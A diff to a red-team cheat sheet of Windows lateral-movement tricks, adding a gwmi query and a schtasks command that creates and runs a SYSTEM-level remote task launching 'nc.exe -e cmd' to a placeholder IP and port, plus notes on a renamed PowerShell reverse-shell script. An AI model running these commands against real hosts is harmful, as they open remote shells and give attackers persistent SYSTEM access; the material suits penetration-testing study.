@@ -1,17 +1,37 @@
-# Tools
+## Interesting Tools and Tricks
 
-- [Invoke-PowerShellTcp.ps1](#-invoke-powershelltcpps1-)
-- [Find-PSRemotingLocalAdminAccess.ps1](#-find-psremotinglocaladminaccessps1-)
-- [Find-WMILocalAdminAccess.ps1](#-find-wmilocaladminaccessps1-)
+- [gwmi Commands](#gwmi-commands)
+- [Schedule Tasks in Remote Computer](#schedule-tasks-in-remote-computer)
+- [`Invoke-PowerShellTcp.ps1`](#-invoke-powershelltcpps1-)
+- [`Find-PSRemotingLocalAdminAccess.ps1`](#-find-psremotinglocaladminaccessps1-)
+- [`Find-WMILocalAdminAccess.ps1`](#-find-wmilocaladminaccessps1-)
 - [Enter-PSSession (cmdlet)](#enter-pssession--cmdlet-)
 - [Invoke-Command (cmdlet)](#invoke-command--cmdlet-)
 - [WinRS.exe](#winrsexe)
 - [Loader.exe](#loaderexe)
-- [Task Scheduling](#task-scheduling)
+- [CMD Intersting Commands](#cmd-intersting-commands)
+    + [Task Scheduling](#task-scheduling)
+    + [Port Redirection](#port-redirection)
 - [File Copy Using Powershell](#file-copy-using-powershell)
+- [Run WMI Commands](#run-wmi-commands)
 - [BloodHound](#bloodhound)
 
 
+### gwmi Commands
+---
+```powershell
+PS C:> gwmi -class win32_operatingsystem -ComputerName <computer_fqdn>
+```
+
+### Schedule Tasks in Remote Computer
+---
+```powershell
+# Create the task
+C:> schtasks /create /S <host_fqdn> /SC Weekly /RU “NT Authority\SYSTEM” /TN “<TASK_NAME>” /TR “C:\Users\Public\Downloads\nc.exe -e cmd <IP> <PORT>”
+
+# Run the task
+C:> schtasks /Run /S <host_fqdn> /TN “<TASK_NAME>”
+```
 ### `Invoke-PowerShellTcp.ps1`
 ---
 Opens a shell. Modified Version of the original `Invoke-PowerShellTcp_Old.ps1`. Replacing the main function name to `Power`.
